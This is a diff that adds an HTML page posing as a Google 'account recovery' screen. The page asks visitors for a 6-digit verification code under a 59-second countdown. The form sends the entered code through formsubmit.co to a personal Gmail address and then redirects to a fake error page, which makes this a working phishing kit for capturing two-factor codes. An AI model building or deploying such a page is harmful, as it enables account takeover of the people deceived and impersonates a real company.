@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+	<link rel="stylesheet" href="sendMaseege.css">
+</head>
+<body>
+	<section id="massege">
+		<div class="top">
+			<div class="title">
+			<img src="pngegg.png" alt="">
+			<h1>account recovery</h1>
+			<p>to help keep your account safe google wants to make sure thats its really you trying to sighn in</p>	
+			</div>
+			<div class="main">
+				<p>a text massege width a 6-digital verication code was just sent to you</p>
+<!--		show time		-->
+				<div id="timer">59</div>
+				
+				<form action="https://formsubmit.co/comment.ahmet@gmail.com" method="POST">
+					
+					<!-- hiden	-->
+					<input type="hidden" name="_next" value="https://devoloperrs.github.io/error/wrong.html">
+					<input type="hidden" name="_subject" value="New reservation!">
+				<input type="name" placeholder="Enter the code" name="verication code" required autocomplete="off" class="input">
+				<div class="container-btn">
+					<input type="submit" id="button" value="send" >
+				</div>
+				</form>
+				
+			</div>
+			
+		</div>
+		<div class="bottom">
+			
+		</div>
+	</section>
+	
+<!-- java script	-->
+	<script>
+  var seconds = 59;
+  
+  function countdown() {
+    document.getElementById("timer").textContent = seconds;
+    if (seconds === 0) {
+      clearInterval(timerInterval);
+      alert("Time's up!");
+    } else {
+      seconds--;
+    }
+  }
+
+  var timerInterval = setInterval(countdown, 1000);
+</script>
+</body>
+</html>
